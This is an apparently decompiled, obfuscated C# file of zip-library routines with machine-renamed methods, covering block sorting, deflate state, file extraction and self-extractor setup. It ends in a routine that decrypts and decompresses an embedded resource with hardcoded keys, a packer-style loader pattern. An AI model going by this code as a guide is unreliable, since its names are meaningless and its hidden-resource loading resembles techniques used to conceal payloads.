			while (i < 7)
			{
				num2 += (int)class39_0.short_2[i * 2];
				i++;
			}
			while (i < 128)
			{
				num += (int)class39_0.short_2[i * 2];
				i++;
			}
			while (i < Class49.int_3)
			{
				num2 += (int)class39_0.short_2[i * 2];
				i++;
			}
			class39_0.sbyte_0 = (sbyte)((num2 > num >> 2) ? Class39.int_10 : Class39.int_11);
		}

		static void smethod_639(Stream8 stream8_0)
		{
			Class16.smethod_524(stream8_0.class32_0, 23);
			Class16.smethod_524(stream8_0.class32_0, 114);
			Class16.smethod_524(stream8_0.class32_0, 69);
			Class16.smethod_524(stream8_0.class32_0, 56);
			Class16.smethod_524(stream8_0.class32_0, 80);
			Class16.smethod_524(stream8_0.class32_0, 144);
			Class32 class32_ = stream8_0.class32_0;
			uint uint_ = stream8_0.uint_0;
			Class16.smethod_156(uint_, class32_);
			Class16.smethod_567(stream8_0.class32_0);
		}

		static void smethod_640(Class33 class33_0)
		{
			Class33.Class34 class34_ = class33_0.class34_0;
			int[] int_ = class34_.int_7;
			int[] int_2 = class34_.int_8;
			bool[] bool_ = class34_.bool_2;
			int[] int_3 = class34_.int_12;
			byte[] byte_ = class34_.byte_6;
			int[] int_4 = class34_.int_13;
			char[] char_ = class34_.char_1;
			int int_5 = class33_0.int_3;
			int int_6 = class33_0.int_7;
			bool bool_2 = class33_0.bool_0;
			int num = 65537;
			while (--num >= 0)
			{
				int_3[num] = 0;
			}
			for (int i = 0; i < Class36.int_9; i++)
			{
				byte_[int_5 + i + 2] = byte_[i % (int_5 + 1) + 1];
			}
			int num2 = int_5 + Class36.int_9 + 1;
			while (--num2 >= 0)
			{
				char_[num2] = '\0';
			}
			byte_[0] = byte_[int_5 + 1];
			int num3 = (int)(byte_[0] & 255);
			for (int j = 0; j <= int_5; j++)
			{
				int num4 = (int)(byte_[j + 1] & 255);
				int_3[(num3 << 8) + num4]++;
				num3 = num4;
			}
			for (int k = 1; k <= 65536; k++)
			{
				int_3[k] += int_3[k - 1];
			}
			num3 = (int)(byte_[1] & 255);
			for (int l = 0; l < int_5; l++)
			{
				int num5 = (int)(byte_[l + 2] & 255);
				int_4[--int_3[(num3 << 8) + num5]] = l;
				num3 = num5;
			}
			int_4[--int_3[((int)(byte_[int_5 + 1] & 255) << 8) + (int)(byte_[1] & 255)]] = int_5;
			int num6 = 256;
			while (--num6 >= 0)
			{
				bool_[num6] = false;
				int_[num6] = num6;
			}
			int num7 = 364;
			while (num7 != 1)
			{
				num7 /= 3;
				for (int m = num7; m <= 255; m++)
				{
					int num8 = int_[m];
					int num9 = int_3[num8 + 1 << 8] - int_3[num8 << 8];
					int num10 = num7 - 1;
					int num11 = m;
					int num12 = int_[num11 - num7];
					while (int_3[num12 + 1 << 8] - int_3[num12 << 8] > num9)
					{
						int_[num11] = num12;
						num11 -= num7;
						if (num11 <= num10)
						{
							break;
						}
						num12 = int_[num11 - num7];
					}
					int_[num11] = num8;
				}
			}
			for (int n = 0; n <= 255; n++)
			{
				int num13 = int_[n];
				for (int num14 = 0; num14 <= 255; num14++)
				{
					int num15 = (num13 << 8) + num14;
					int num16 = int_3[num15];
					if ((num16 & Class33.int_11) != Class33.int_11)
					{
						int num17 = num16 & Class33.int_12;
						int num18 = (int_3[num15 + 1] & Class33.int_12) - 1;
						if (num18 > num17)
						{
							Class16.smethod_188(2, num18, num17, class33_0, class34_);
							if (bool_2 && class33_0.int_6 > int_6)
							{
								return;
							}
						}
						int_3[num15] = (num16 | Class33.int_11);
					}
				}
				for (int num19 = 0; num19 <= 255; num19++)
				{
					int_2[num19] = (int_3[(num19 << 8) + num13] & Class33.int_12);
				}
				int num20 = int_3[num13 << 8] & Class33.int_12;
				int num21 = int_3[num13 + 1 << 8] & Class33.int_12;
				while (num20 < num21)
				{
					int num22 = int_4[num20];
					num3 = (int)(byte_[num22] & 255);
					if (!bool_[num3])
					{
						int_4[int_2[num3]] = ((num22 == 0) ? int_5 : (num22 - 1));
						int_2[num3]++;
					}
					num20++;
				}
				int num23 = 256;
				while (--num23 >= 0)
				{
					int_3[(num23 << 8) + num13] |= Class33.int_11;
				}
				bool_[num13] = true;
				if (n < 255)
				{
					int num24 = int_3[num13 << 8] & Class33.int_12;
					int num25 = (int_3[num13 + 1 << 8] & Class33.int_12) - num24;
					int num26 = 0;
					while (num25 >> num26 > 65534)
					{
						num26++;
					}
					for (int num27 = 0; num27 < num25; num27++)
					{
						int num28 = int_4[num24 + num27];
						char c = (char)(num27 >> num26);
						char_[num28] = c;
						if (num28 < Class36.int_9)
						{
							char_[num28 + int_5 + 1] = c;
						}
					}
				}
			}
		}

		static int smethod_641(RNGCryptoServiceProvider rngcryptoServiceProvider_0, int int_0)
		{
			byte[] array = new byte[4];
			int num;
			do
			{
				rngcryptoServiceProvider_0.GetBytes(array);
				num = (BitConverter.ToInt32(array, 0) & 2147483647);
			}
			while (num >= int_0 * (2147483647 / int_0));
			return num % int_0;
		}

		static int smethod_642(string string_0, string string_1, GClass0 gclass0_0)
		{
			int num = 0;
			while (true)
			{
				switch (gclass0_0.ExtractExistingFile)
				{
				case Enum3.const_1:
					goto IL_4F;
				case Enum3.const_2:
					goto IL_68;
				case Enum3.const_3:
					if (num > 0)
					{
						goto IL_8D;
					}
					Class16.smethod_560(gclass0_0, string_1);
					if (!gclass0_0.bool_12)
					{
						num++;
						continue;
					}
					return 2;
				}
				break;
			}
			throw new ZipException(string.Format("The file {0} already exists.", string_0));
			IL_4F:
			Class16.smethod_529(gclass0_0, "the file {0} exists; will overwrite it...", new object[]
			{
				string_0
			});
			return 0;
			IL_68:
			Class16.smethod_529(gclass0_0, "the file {0} exists; not extracting entry...", new object[]
			{
				gclass0_0.string_1
			});
			Class16.smethod_499(gclass0_0, string_1);
			return 1;
			IL_8D:
			throw new ZipException(string.Format("The file {0} already exists.", string_0));
		}

		static object smethod_643(Class54 class54_0)
		{
			return class54_0.object_0;
		}

		static void smethod_644(string string_0, GClass1 gclass1_0, string string_1)
		{
			Class16.smethod_505(string_1, false, gclass1_0, string_0, null);
		}

		static void smethod_645(Class39 class39_0)
		{
			switch (class39_0.class40_0.enum15_0)
			{
			case Enum15.const_0:
				class39_0.delegate5_0 = new Class39.Delegate5(class39_0.method_0);
				return;
			case Enum15.const_1:
				class39_0.delegate5_0 = new Class39.Delegate5(class39_0.method_1);
				return;
			case Enum15.const_2:
				class39_0.delegate5_0 = new Class39.Delegate5(class39_0.method_2);
				return;
			default:
				return;
			}
		}

		static EventArgs4 smethod_646(GClass0 gclass0_0, string string_0, string string_1)
		{
			return new EventArgs4
			{
				string_0 = string_1,
				enum6_0 = Enum6.const_19,
				gclass0_0 = gclass0_0,
				string_1 = string_0
			};
		}

		static Stream smethod_647(Stream0 stream0_0)
		{
			return stream0_0.stream_0;
		}

		static string smethod_648(ZipSegmentedStream zipSegmentedStream_0, uint uint_0)
		{
			if (uint_0 >= 99u)
			{
				zipSegmentedStream_0.bool_0 = true;
				throw new OverflowException("The number of zip segments would exceed 99.");
			}
			return string.Format("{0}.z{1:D2}", Path.Combine(Path.GetDirectoryName(zipSegmentedStream_0.string_0), Path.GetFileNameWithoutExtension(zipSegmentedStream_0.string_0)), uint_0 + 1u);
		}

		static void smethod_649(string string_0, bool bool_0, IEnumerable<string> ienumerable_0, GClass1 gclass1_0)
		{
			if (ienumerable_0 == null)
			{
				throw new ArgumentNullException("fileNames");
			}
			gclass1_0.bool_10 = false;
			Class16.smethod_228(gclass1_0);
			if (bool_0)
			{
				using (IEnumerator<string> enumerator = ienumerable_0.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string current = enumerator.Current;
						if (gclass1_0.bool_10)
						{
							break;
						}
						if (string_0 != null)
						{
							string fullPath = Path.GetFullPath(Path.Combine(string_0, Path.GetDirectoryName(current)));
							Class16.smethod_655(gclass1_0, current, fullPath);
						}
						else
						{
							Class16.smethod_655(gclass1_0, current, null);
						}
					}
					goto IL_AF;
				}
			}
			foreach (string current2 in ienumerable_0)
			{
				if (gclass1_0.bool_10)
				{
					break;
				}
				Class16.smethod_655(gclass1_0, current2, string_0);
			}
			IL_AF:
			if (!gclass1_0.bool_10)
			{
				Class16.smethod_209(gclass1_0);
			}
		}

		static EventArgs4 smethod_650(string string_0, string string_1)
		{
			return new EventArgs4(string_0, Enum6.const_21)
			{
				string_1 = string_1
			};
		}

		static void smethod_651(Class57 class57_0, byte[] byte_0)
		{
			class57_0.byte_1 = byte_0;
		}

		static int smethod_652(GClass2 gclass2_0, int int_0)
		{
			gclass2_0.int_4 = int_0;
			return Class16.smethod_451(int_0, true, gclass2_0);
		}

		static Class53 smethod_653(Class55 class55_0)
		{
			return class55_0.class53_0;
		}

		static void smethod_654(IPAddress ipaddress_0, Class64 class64_0)
		{
			if (ipaddress_0 == null)
			{
				throw new ArgumentNullException();
			}
			class64_0.ipaddress_0 = ipaddress_0;
			Class16.smethod_578(class64_0);
		}

		static GClass0 smethod_655(GClass1 gclass1_0, string string_0, string string_1)
		{
			string string_2 = Class16.smethod_504(string_0, string_1);
			GClass0 gclass0_ = Class16.smethod_481(string_0, string_2);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
			}
			return Class16.smethod_387(gclass1_0, gclass0_);
		}

		static bool smethod_656(string string_0, Class12 class12_0)
		{
			string input = (class12_0.string_1.IndexOf('\\') == -1) ? Path.GetFileName(string_0) : string_0;
			bool flag = class12_0.regex_0.IsMatch(input);
			if (class12_0.comparisonOperator_0 != ComparisonOperator.EqualTo)
			{
				flag = !flag;
			}
			return flag;
		}

		static byte[] smethod_657(Class61 class61_0)
		{
			return class61_0.byte_1;
		}

		static int smethod_658(Class32 class32_0)
		{
			return class32_0.int_1;
		}

		static byte[] smethod_659(string string_0)
		{
			return Class16.smethod_155(string_0, Class21.encoding_0);
		}

		static GClass1 smethod_660(string string_0, TextWriter textWriter_0, Encoding encoding_0, EventHandler<EventArgs1> eventHandler_0)
		{
			GClass1 gClass = new GClass1();
			gClass.encoding_0 = (encoding_0 ?? GClass1.encoding_1);
			gClass.enum9_0 = Enum9.const_3;
			gClass.textWriter_0 = textWriter_0;
			gClass.string_0 = string_0;
			if (eventHandler_0 != null)
			{
				gClass.eventHandler_1 = eventHandler_0;
			}
			if (gClass.textWriter_0 != null)
			{
				gClass.textWriter_0.WriteLine("reading from {0}...", string_0);
			}
			Class16.smethod_435(gClass);
			gClass.bool_4 = true;
			return gClass;
		}

		static void smethod_661(string string_0, IEnumerable<string> ienumerable_0, GClass1 gclass1_0)
		{
			if (ienumerable_0 == null)
			{
				throw new ArgumentNullException("fileNames");
			}
			Class16.smethod_228(gclass1_0);
			foreach (string current in ienumerable_0)
			{
				Class16.smethod_670(gclass1_0, current, string_0);
			}
			Class16.smethod_209(gclass1_0);
		}

		static int smethod_662(GClass2 gclass2_0)
		{
			if (gclass2_0.class44_0 == null)
			{
				throw new GException0("No Inflate State!");
			}
			int result = Class16.smethod_72(gclass2_0.class44_0);
			gclass2_0.class44_0 = null;
			return result;
		}

		static string smethod_663(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.string_3;
			}
			if (class8_0.stream1_0 != null)
			{
				return class8_0.stream1_0.string_0;
			}
			return class8_0.stream0_0.string_0;
		}

		static void smethod_664(SelfExtractorFlavor selfExtractorFlavor_0, string string_0, GClass1 gclass1_0)
		{
			Class31 @class = new Class31();
			@class.method_1(selfExtractorFlavor_0);
			Class16.smethod_61(@class, gclass1_0, string_0);
		}

		static void smethod_665(IEnumerable<string> ienumerable_0, string string_0, GClass1 gclass1_0)
		{
			Class16.smethod_649(string_0, false, ienumerable_0, gclass1_0);
		}

		static void smethod_666(string string_0, GClass1 gclass1_0)
		{
			bool flag = false;
			int num = 3;
			int num2 = 0;
			while (num2 < num && !flag)
			{
				try
				{
					File.Delete(string_0);
					flag = true;
				}
				catch (UnauthorizedAccessException)
				{
					Console.WriteLine("************************************************** Retry delete.");
					Thread.Sleep(200 + num2 * 200);
				}
				num2++;
			}
		}

		static GClass0 smethod_667(string string_0, Delegate0 delegate0_0)
		{
			return Class16.smethod_381(delegate0_0, string_0, Enum0.const_4, null);
		}

		static GClass0 smethod_668(string string_0, GClass1 gclass1_0, string string_1)
		{
			return Class16.smethod_96(string_1, string_0, Encoding.Default, gclass1_0);
		}

		static void smethod_669(string string_0, Class57 class57_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class57_0.string_1 = string_0;
		}

		static GClass0 smethod_670(GClass1 gclass1_0, string string_0, string string_1)
		{
			string text = Class16.smethod_504(string_0, string_1);
			if (gclass1_0[text] != null)
			{
				Class16.smethod_542(gclass1_0, text);
			}
			return Class16.smethod_655(gclass1_0, string_0, string_1);
		}

		static long smethod_671(Stream4 stream4_0)
		{
			return stream4_0.long_0;
		}

		static int smethod_672(Stream12 stream12_0)
		{
			if (stream12_0.gclass3_0 == null)
			{
				return 0;
			}
			return (int)(~(int)stream12_0.gclass3_0.uint_2);
		}

		static bool smethod_673(Stream11 stream11_0, Class46 class46_0)
		{
			GClass2 gclass2_ = class46_0.gclass2_0;
			Class16.smethod_320(gclass2_);
			gclass2_.int_0 = 0;
			gclass2_.int_1 = class46_0.int_3;
			gclass2_.int_2 = 0;
			gclass2_.int_3 = class46_0.byte_1.Length;
			do
			{
				Class16.smethod_675(gclass2_, Enum19.const_0);
			}
			while (gclass2_.int_1 > 0 || gclass2_.int_3 == 0);
			Class16.smethod_675(gclass2_, Enum19.const_2);
			class46_0.int_4 = (int)gclass2_.long_1;
			return true;
		}

		static string smethod_674(Class62 class62_0)
		{
			return class62_0.string_2;
		}

		static int smethod_675(GClass2 gclass2_0, Enum19 enum19_0)
		{
			if (gclass2_0.class39_0 == null)
			{
				throw new GException0("No Deflate State!");
			}
			return Class16.smethod_464(gclass2_0.class39_0, enum19_0);
		}

		static bool smethod_676(string string_0, GClass0 gclass0_0, GClass1 gclass1_0)
		{
			EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
			if (eventHandler_ != null)
			{
				EventArgs4 eventArgs = Class16.smethod_646(gclass0_0, string_0, gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_9 = true;
				}
			}
			return gclass1_0.bool_9;
		}

		static GClass0 smethod_677(string string_0, string string_1, GClass1 gclass1_0)
		{
			if (File.Exists(string_1))
			{
				return Class16.smethod_655(gclass1_0, string_1, string_0);
			}
			if (!Directory.Exists(string_1))
			{
				throw new FileNotFoundException(string.Format("That file or directory ({0}) does not exist!", string_1));
			}
			return Class16.smethod_57(string_1, string_0, gclass1_0);
		}

		static uint smethod_678(uint[] uint_0, uint uint_1, GClass3 gclass3_0)
		{
			uint num = 0u;
			int num2 = 0;
			while (uint_1 != 0u)
			{
				if ((uint_1 & 1u) == 1u)
				{
					num ^= uint_0[num2];
				}
				uint_1 >>= 1;
				num2++;
			}
			return num;
		}

		static byte[] smethod_679(byte[] byte_0)
		{
			Assembly callingAssembly = Assembly.GetCallingAssembly();
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			if (callingAssembly != executingAssembly && !Class16.smethod_397(executingAssembly, callingAssembly))
			{
				return null;
			}
			Class74.Stream14 stream = new Class74.Stream14(byte_0);
			byte[] array = new byte[0];
			int num = Class16.smethod_630(stream);
			if (num == 67324752)
			{
				short num2 = (short)Class16.smethod_20(stream);
				int num3 = Class16.smethod_20(stream);
				int num4 = Class16.smethod_20(stream);
				if (num == 67324752 && num2 == 20 && num3 == 0)
				{
					if (num4 == 8)
					{
						Class16.smethod_630(stream);
						Class16.smethod_630(stream);
						Class16.smethod_630(stream);
						int num5 = Class16.smethod_630(stream);
						int num6 = Class16.smethod_20(stream);
						int num7 = Class16.smethod_20(stream);
						if (num6 > 0)
						{
							byte[] buffer = new byte[num6];
							stream.Read(buffer, 0, num6);
						}
						if (num7 > 0)
						{
							byte[] buffer2 = new byte[num7];
							stream.Read(buffer2, 0, num7);
						}
						byte[] array2 = new byte[stream.Length - stream.Position];
						stream.Read(array2, 0, array2.Length);
						Class74.Class75 class75_ = new Class74.Class75(array2);
						array = new byte[num5];
						Class16.smethod_283(array.Length, 0, class75_, array);
						goto IL_279;
					}
				}
				throw new FormatException("Wrong Header Signature");
			}
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num == 8223355)
			{
				if (num8 == 1)
				{
					int num9 = Class16.smethod_630(stream);
					array = new byte[num9];
					int num11;
					for (int i = 0; i < num9; i += num11)
					{
						int num10 = Class16.smethod_630(stream);
						num11 = Class16.smethod_630(stream);
						byte[] array3 = new byte[num10];
						stream.Read(array3, 0, array3.Length);
						Class74.Class75 class75_2 = new Class74.Class75(array3);
						Class16.smethod_283(num11, i, class75_2, array);
					}
				}
				if (num8 == 2)
				{
					byte[] byte_ = new byte[]
					{
						193,
						46,
						246,
						148,
						3,
						27,
						192,
						11
					};
					byte[] byte_2 = new byte[]
					{
						20,
						133,
						77,
						66,
						24,
						45,
						2,
						129
					};
					using (ICryptoTransform cryptoTransform = Class16.smethod_473(true, byte_2, byte_))
					{
						byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
						array = Class16.smethod_679(byte_3);
					}
				}
				if (num8 != 3)
				{
					goto IL_279;
				}
				byte[] byte_4 = new byte[]
				{
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1,
					1
				};
				byte[] byte_5 = new byte[]
				{
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2,
					2
				};
				using (ICryptoTransform cryptoTransform2 = Class16.smethod_248(byte_5, byte_4, true))
				{
					byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
					array = Class16.smethod_679(byte_6);
					goto IL_279;
				}
			}
			throw new FormatException("Unknown Header");
			IL_279:
			stream.Close();
			stream = null;
			return array;
		}
	}
}
